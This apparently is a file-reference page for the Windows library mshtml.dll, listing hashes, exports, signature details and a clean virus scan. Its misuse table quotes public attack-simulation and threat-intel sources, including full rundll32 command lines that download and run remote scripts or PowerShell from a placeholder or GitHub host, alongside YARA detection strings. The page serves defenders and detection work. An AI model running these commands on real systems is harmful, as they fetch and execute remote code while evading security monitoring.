---
title: mshtml.dll | Microsoft (R) HTML Viewer
excerpt: What is mshtml.dll?
---

# mshtml.dll 

* File Path: `C:\Windows\system32\mshtml.dll`
* Description: Microsoft (R) HTML Viewer

## Hashes

Type | Hash
-- | --
MD5 | `991FCF80CBA4226446464056FE2FD2A4`
SHA1 | `C33D63ED5D8808C7EBA161F5CE8F3341F49E1A54`
SHA256 | `3D95FBA53ED28B7B87543ADFC7A9F48BDCBE7B48F245300B982CC07E4B2392C7`
SHA384 | `11A415420FD50168685E639BD3CDFF51EABBBF74FE787A45E1D7B7C58D488113220010D65E97DC4C4FB198B9EDAE0A52`
SHA512 | `89A6C502B331B5F6D6E88409EFDBDA00DC9CFA4773A4DCC6B6E2E8C2753721065FA86FEA83B76ACBA7AFDC5920F8C4264BDFEDD1527FFF27ADBE908B451234A0`
SSDEEP | `393216:UiKpqqF/1+TuSc3gIjZjq0vMfp7XaxPYFY5G:xKsX`
IMP | `15A68012EEC9EBBFE108955F80E80B99`
PESHA1 | `7AD0B82DDE272882E8DC326F1EBC02340EB10F7B`
PE256 | `55AE36F5903DDE91137CA90D541831A4199B59E56961E7B576EF2E0128CE6718`

## DLL Exports:

Function Name | Ordinal | Type
-- | -- | --
`RunHTMLApplication` | 135 | Exported Function
`ShowHTMLDialog` | 136 | Exported Function
`PrintHTML` | 133 | Exported Function
`InitializeLocalHtmlEngine` | 119 | Exported Function
`MatchExactGetIDsOfNames` | 132 | Exported Function
`ShowHTMLDialogEx` | 137 | Exported Function
`TravelLogStgCreateInstance` | 142 | Exported Function
`UninitializeLocalHtmlEngine` | 143 | Exported Function
`TravelLogCreateInstance` | 141 | Exported Function
`ShowModalDialog` | 139 | Exported Function
`ShowModelessHTMLDialog` | 140 | Exported Function
`CreateHTMLPropertyPage` | 111 | Exported Function
`DllCanUnloadNow` | 112 | Exported Function
`CreateCoreWebView` | 110 | Exported Function
`ClearPhishingFilterData` | 108 | Exported Function
`ConvertAndEscapePostData` | 109 | Exported Function
`DllEnumClassObjects` | 113 | Exported Function
`IEIsXMLNSRegistered` | 117 | Exported Function
`IERegisterXMLNS` | 118 | Exported Function
`GetWebPlatformObject` | 116 | Exported Function
`DllGetClassObject` | 114 | Exported Function
`GetColorValueFromString` | 115 | Exported Function


## Signature

* Status: Signature verified.
* Serial: `330000026551AE1BBD005CBFBD000000000265`
* Thumbprint: `E168609353F30FF2373157B4EB8CD519D07A2BFF`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: MSHTML.DLL.MUI
* Product Name: Internet Explorer
* Company Name: Microsoft Corporation
* File Version: 11.00.19041.1 (WinBuild.160101.0800)
* Product Version: 11.00.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/69
* VirusTotal Link: https://www.virustotal.com/gui/file/3d95fba53ed28b7b87543adfc7a9f48bdcbe7b48f245300b982cc07e4b2392c7/detection/


## Possible Misuse

*The following table contains possible examples of `mshtml.dll` being misused. While `mshtml.dll` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `Name: Mshtml.dll` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `- Command: rundll32.exe Mshtml.dll,PrintHTML "C:\temp\calc.hta"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `- Path: c:\windows\system32\mshtml.dll` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `- Path: c:\windows\syswow64\mshtml.dll` | 
[malware-ioc](https://github.com/eset/malware-ioc) | [misp-dukes-operation-ghost-event.json](https://github.com/eset/malware-ioc/blob/master/dukes/misp-dukes-operation-ghost-event.json) | `"description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [misp_invisimole.json](https://github.com/eset/malware-ioc/blob/master/invisimole/misp_invisimole.json) | `"description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md) | Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md) | rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec(); | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md) | rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_khrat.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_khrat.yar) | $x2 = "CreateObject(\"WScript.Shell\").Run \"rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_tidepool.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_tidepool.yar) | $x2 = "C:\\PROGRA~2\\IEHelper\\mshtml.dll" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_tidepool.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_tidepool.yar) | $x3 = "C:\\DOCUME~1\\ALLUSE~1\\IEHelper\\mshtml.dll" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_unit78020_malware.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_unit78020_malware.yar) | $s4 = "mshtml.dat" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_mal_scripts.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_mal_scripts.yar) | $s1 = "mshtml,RunHTMLApplication" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


